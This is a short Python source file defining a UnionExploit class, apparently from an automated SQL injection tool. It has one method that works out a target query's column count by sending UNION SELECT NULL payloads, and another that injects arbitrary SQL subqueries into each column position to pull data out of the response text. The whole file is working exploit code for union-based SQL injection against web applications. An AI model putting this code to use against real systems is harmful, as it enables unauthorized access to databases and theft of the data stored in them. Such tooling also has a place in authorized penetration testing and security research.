import logging
import re

logger = logging.getLogger(__name__)

class UnionExploit:
    def __init__(self, request, vuln, settings):
        self.request = request
        self.vuln = vuln
        self.settings = settings

    def detect_columns(self, max_cols=50):
        """Find number of columns in the original query"""
        for cols in range(1, max_cols+1):
            nulls = ','.join(['NULL'] * cols)
            payload = f"{self.vuln['original_value']}' UNION SELECT {nulls}-- -"
            resp = self.request.send(self.vuln['param'], payload, self.vuln['location'])
            if resp and "error" not in resp.text.lower():
                logger.info(f"Detected {cols} columns")
                return cols
        return 0

    def extract_data(self, query, columns):
        """Extract data using union injection, assuming first column is injectable"""
        results = []
        # Try to inject into each column position
        for col in range(1, columns+1):
            parts = ['NULL'] * columns
            parts[col-1] = f"({query})"
            payload = f"{self.vuln['original_value']}' UNION SELECT {','.join(parts)}-- -"
            resp = self.request.send(self.vuln['param'], payload, self.vuln['location'])
            if resp:
                # Extract data from response (simplified: return whole text)
                results.append(resp.text)
        return results